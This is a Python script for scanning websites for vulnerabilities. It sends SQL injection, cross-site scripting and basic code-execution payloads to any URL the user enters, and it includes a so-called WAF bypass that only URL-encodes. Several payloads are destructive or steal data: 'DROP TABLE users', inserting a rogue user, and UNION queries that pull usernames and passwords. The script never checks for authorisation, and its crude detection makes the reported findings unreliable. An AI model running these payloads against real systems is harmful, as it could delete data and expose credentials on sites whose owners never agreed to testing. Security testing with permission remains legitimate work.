import requests
from urllib.parse import urljoin, quote
import logging
import re
from urllib.parse import urlparse

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define payloads for various vulnerabilities
payloads = {
    "sql_injection": {
        "blind": [
            "1 AND 1=1",
            "1 AND 1=2",
            "1%20AND%201=1",
            "1%20AND%201=2"
        ],
        "error_based": [
            "'",
            '"',
            "1' OR 1=1--",
            "1%27%20OR%201%3D1--"
        ],
        "union_based": [
            "1 UNION SELECT NULL, username, password FROM users--",
            "1 UNION ALL SELECT NULL, version(), NULL--",
            "1%20UNION%20SELECT%20NULL,%20username,%20password%20FROM%20users--"
        ],
        "stacked_queries": [
            "1; DROP TABLE users--",
            "1; INSERT INTO users (username, password) VALUES ('test', 'test')--",
            "1%3B%20DROP%20TABLE%20users--"
        ],
        "time_based": [
            "1; IF(1=1, SLEEP(5), 0)--",
            "1; IF(1=2, SLEEP(5), 0)--",
            "1%3B%20IF%281=1,%20SLEEP%285%29,%200%29--"
        ],
        "qualitative_based": [
            "1' AND (SELECT SUBSTRING(@@version,1,1) = '5')--",
            "1%27%20AND%20(SELECT%20SUBSTRING%28%40%40version,1,1%29%20=%20'5')--"
        ]
    },
    "xss": [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '" onmouseover="alert(1)"',
        '<img%20src="x"%20onerror="alert(1)">'
    ],
    "csrf": [],  # Consider implementing CSRF token detection
    "rce": [
        "<?php phpinfo(); ?>",
        "system('ls');",
        "exec('whoami');"
    ]
}

def validate_url(url):
    parsed_url = urlparse(url)
    return parsed_url.scheme in ['http', 'https'] and parsed_url.netloc

def bypass_waf(payload):
    # Apply some WAF bypass techniques, such as URL encoding
    encoded_payload = quote(payload)
    return encoded_payload

def check_sql_injection(url):
    logging.info("\n[*] Checking for SQL Injection...")
    for method, payloads_list in payloads["sql_injection"].items():
        for payload in payloads_list:
            bypassed_payload = bypass_waf(payload)
            test_url = f"{url}?id={bypassed_payload}"
            try:
                response = requests.get(test_url)
                if response.status_code == 200 and ("error" in response.text.lower() or "mysql" in response.text.lower()):
                    logging.info(f"[+] Potential SQL Injection ({method}) vulnerability detected at: {test_url}")
                else:
                    logging.info(f"[-] No SQL Injection ({method}) detected at: {test_url}")
            except requests.RequestException as e:
                logging.error(f"[!] Error checking SQL Injection ({method}): {e}")

def check_xss(url):
    logging.info("\n[*] Checking for XSS...")
    for payload in payloads["xss"]:
        bypassed_payload = bypass_waf(payload)
        test_url = f"{url}?search={bypassed_payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                logging.info(f"[+] Potential XSS vulnerability detected at: {test_url}")
            else:
                logging.info(f"[-] No XSS detected at: {test_url}")
        except requests.RequestException as e:
            logging.error(f"[!] Error checking XSS: {e}")

def check_csrf(url):
    logging.info("\n[*] Checking for CSRF protection...")
    try:
        response = requests.get(url)
        if response.status_code == 200 and not re.search(r'csrf|token', response.text, re.IGNORECASE):
            logging.info(f"[+] Possible CSRF vulnerability detected at: {url}")
        else:
            logging.info(f"[-] CSRF protection likely present at: {url}")
    except requests.RequestException as e:
        logging.error(f"[!] Error checking CSRF protection: {e}")

def check_rce(url):
    logging.info("\n[*] Checking for Remote Code Execution (RCE)...")
    for payload in payloads["rce"]:
        test_url = urljoin(url, f"?file={payload}")
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and ("phpinfo" in response.text.lower() or "root" in response.text.lower()):
                logging.info(f"[+] Potential RCE vulnerability detected at: {test_url}")
            else:
                logging.info(f"[-] No RCE detected at: {test_url}")
        except requests.RequestException as e:
            logging.error(f"[!] Error checking RCE: {e}")

def advanced_scan(url):
    if not validate_url(url):
        logging.error("Invalid URL format.")
        return

    logging.info("\n[*] Starting advanced scan...")
    check_sql_injection(url)
    check_xss(url)
    check_csrf(url)
    check_rce(url)

def main():
    url = input("Enter the URL to test: ").strip()
    if not url:
        logging.error("URL cannot be empty.")
        return

    logging.info(f"\n[*] Testing URL: {url}")
    advanced_scan(url)

if __name__ == "__main__":
    main()
